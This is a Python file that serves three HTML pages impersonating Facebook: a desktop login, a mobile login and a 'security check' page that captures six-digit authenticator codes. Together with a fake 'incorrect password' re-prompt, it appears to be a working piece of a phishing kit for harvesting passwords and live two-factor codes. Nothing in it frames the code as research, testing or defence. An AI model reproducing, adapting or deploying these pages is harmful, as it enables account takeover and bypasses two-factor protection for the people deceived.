"""
HTML Template Manager
Author : Jitu Jak
"""

class TemplateManager:
    def __init__(self, template_type="desktop"):
        self.template_type = template_type
        self.login_template = self._load_login_template()
        self.twofa_template = self._load_2fa_template()
        self.mobile_template = self._load_mobile_template()
    
    def _load_login_template(self):
        return """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }
        body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { width: 100%; max-width: 980px; padding: 20px; display: flex; flex-wrap: wrap; justify-content: space-between; align-items: center; }
        .left { width: 50%; padding-right: 32px; }
        .left h1 { color: #1877f2; font-size: 56px; font-weight: 700; margin-bottom: 10px; font-family: Helvetica, Arial, sans-serif; }
        .left p { font-size: 28px; font-weight: 400; line-height: 1.3; color: #1c1e21; }
        .right { width: 396px; text-align: center; }
        .card { background: #fff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); padding: 20px; margin-bottom: 24px; }
        .card input { width: 100%; padding: 14px 16px; font-size: 17px; border: 1px solid #dddfe2; border-radius: 6px; margin-bottom: 12px; outline: none; transition: border-color 0.2s; }
        .card input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
        .card button[type="submit"] { width: 100%; background: #1877f2; color: white; border: none; border-radius: 6px; padding: 12px; font-size: 20px; font-weight: 700; cursor: pointer; transition: background 0.2s; }
        .card button[type="submit"]:hover { background: #166fe5; }
        .card a { color: #1877f2; font-size: 14px; text-decoration: none; display: block; margin: 16px 0; }
        .card a:hover { text-decoration: underline; }
        .card hr { margin: 20px 0; border: none; border-top: 1px solid #dadde1; }
        .card .create-btn { background: #42b72a; color: white; border: none; border-radius: 6px; padding: 12px 16px; font-size: 17px; font-weight: 700; cursor: pointer; display: inline-block; transition: background 0.2s; }
        .card .create-btn:hover { background: #36a420; }
        .error-box { background: #f02849; color: white; padding: 10px 15px; border-radius: 6px; margin-bottom: 12px; font-size: 14px; display: none; }
        .footer { font-size: 14px; color: #737373; }
        .footer a { color: #737373; text-decoration: none; }
        .footer a:hover { text-decoration: underline; }
        @media (max-width: 900px) {
            .left { width: 100%; text-align: center; padding-right: 0; margin-bottom: 30px; }
            .left h1 { font-size: 40px; }
            .left p { font-size: 20px; }
            .right { width: 100%; max-width: 400px; margin: 0 auto; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="left">
            <h1>facebook</h1>
            <p>Facebook helps you connect and share with the people in your life.</p>
        </div>
        <div class="right">
            <div class="card">
                <div class="error-box" id="errorBox">The email or password you entered is incorrect.</div>
                <form method="POST" action="/login">
                    <input type="text" name="email" placeholder="Email address or phone number" required autofocus autocomplete="email">
                    <input type="password" name="pass" placeholder="Password" required autocomplete="current-password">
                    <!-- Honeypot field -->
                    <input type="text" name="website" style="display:none" tabindex="-1" autocomplete="off">
                    <button type="submit">Log In</button>
                </form>
                <a href="#">Forgotten password?</a>
                <hr>
                <div class="create-btn">Create new account</div>
            </div>
            <div class="footer">
                <a href="#">Create a Page</a> for a celebrity, brand or business.
            </div>
        </div>
    </div>
</body>
</html>"""
    
    def _load_2fa_template(self):
        return """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Security Check</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }
        body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 100%; max-width: 500px; padding: 20px; }
        .card { background: #fff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); padding: 24px; text-align: center; }
        .card h2 { font-size: 20px; margin-bottom: 8px; color: #1c1e21; }
        .card p { font-size: 15px; color: #606770; margin-bottom: 24px; line-height: 1.4; }
        .card .code-inputs { display: flex; justify-content: center; gap: 8px; margin-bottom: 20px; }
        .card .code-inputs input { width: 48px; height: 52px; text-align: center; font-size: 22px; font-weight: 600; border: 1px solid #dddfe2; border-radius: 6px; outline: none; }
        .card .code-inputs input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
        .card button { width: 100%; max-width: 320px; background: #1877f2; color: white; border: none; border-radius: 6px; padding: 12px; font-size: 17px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
        .card button:hover { background: #166fe5; }
        .card a { display: block; margin-top: 16px; color: #1877f2; font-size: 13px; text-decoration: none; }
        .card a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h2>Two-Factor Authentication Required</h2>
            <p>Enter the 6-digit code from your authenticator app.</p>
            <form method="POST" action="/2fa" id="twofaForm">
                <div class="code-inputs">
                    <input type="text" maxlength="1" pattern="[0-9]" inputmode="numeric" required autofocus class="code-input" name="code1">
                    <input type="text" maxlength="1" pattern="[0-9]" inputmode="numeric" required class="code-input" name="code2">
                    <input type="text" maxlength="1" pattern="[0-9]" inputmode="numeric" required class="code-input" name="code3">
                    <input type="text" maxlength="1" pattern="[0-9]" inputmode="numeric" required class="code-input" name="code4">
                    <input type="text" maxlength="1" pattern="[0-9]" inputmode="numeric" required class="code-input" name="code5">
                    <input type="text" maxlength="1" pattern="[0-9]" inputmode="numeric" required class="code-input" name="code6">
                </div>
                <input type="hidden" name="2fa_code" id="hiddenCode">
                <button type="submit">Continue</button>
            </form>
            <a href="#">Try another way to log in</a>
        </div>
    </div>
    <script>
        document.querySelectorAll('.code-input').forEach((input, index, inputs) => {
            input.addEventListener('input', function(e) {
                if (this.value.length === 1 && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
                // Auto-submit when all 6 digits entered
                const allFilled = Array.from(inputs).every(inp => inp.value.length === 1);
                if (allFilled) {
                    document.getElementById('hiddenCode').value = Array.from(inputs).map(inp => inp.value).join('');
                    document.getElementById('twofaForm').submit();
                }
            });
            input.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });
    </script>
</body>
</html>"""
    
    def _load_mobile_template(self):
        return """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Facebook</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        body { background: #fff; }
        .header { background: #1877f2; padding: 12px 16px; }
        .header h1 { color: white; font-size: 24px; font-weight: 700; }
        .content { padding: 24px 16px; }
        .content h2 { font-size: 22px; margin-bottom: 8px; color: #1c1e21; }
        .content p { font-size: 15px; color: #606770; margin-bottom: 24px; }
        .card input { width: 100%; padding: 14px 16px; font-size: 17px; border: 1px solid #dddfe2; border-radius: 6px; margin-bottom: 12px; outline: none; background: #f5f6f7; }
        .card input:focus { border-color: #1877f2; background: #fff; }
        .card button { width: 100%; background: #1877f2; color: white; border: none; border-radius: 6px; padding: 14px; font-size: 17px; font-weight: 600; cursor: pointer; }
        .card button:hover { background: #166fe5; }
        .card a { display: block; text-align: center; color: #1877f2; font-size: 14px; text-decoration: none; margin-top: 16px; }
        .divider { display: flex; align-items: center; margin: 24px 0; }
        .divider hr { flex: 1; border: none; border-top: 1px solid #dadde1; }
        .divider span { padding: 0 16px; color: #737373; font-size: 14px; }
        .create-btn { width: 100%; background: #42b72a; color: white; border: none; border-radius: 6px; padding: 14px; font-size: 17px; font-weight: 600; cursor: pointer; }
        .languages { margin-top: 24px; text-align: center; font-size: 13px; color: #737373; }
        .languages a { color: #385898; text-decoration: none; margin: 0 4px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>facebook</h1>
    </div>
    <div class="content">
        <h2>Log in to Facebook</h2>
        <p>Enter your email and password to stay connected.</p>
        <div class="card">
            <form method="POST" action="/login">
                <input type="text" name="email" placeholder="Email address or phone number" required autofocus>
                <input type="password" name="pass" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
            <a href="#">Forgotten password?</a>
        </div>
        <div class="divider"><hr><span>or</span><hr></div>
        <button class="create-btn">Create new account</button>
        <div class="languages">
            <a href="#">English (US)</a> · <a href="#">Español</a> · <a href="#">Français</a>
        </div>
    </div>
</body>
</html>"""
    
    def get_login_template(self, error=False):
        template = self.login_template
        if error:
            template = template.replace(
                'class="error-box" id="errorBox"',
                'class="error-box" id="errorBox" style="display:block;"'
            )
        return template
    
    def get_2fa_template(self):
        return self.twofa_template
    
    def get_mobile_template(self):
        return self.mobile_template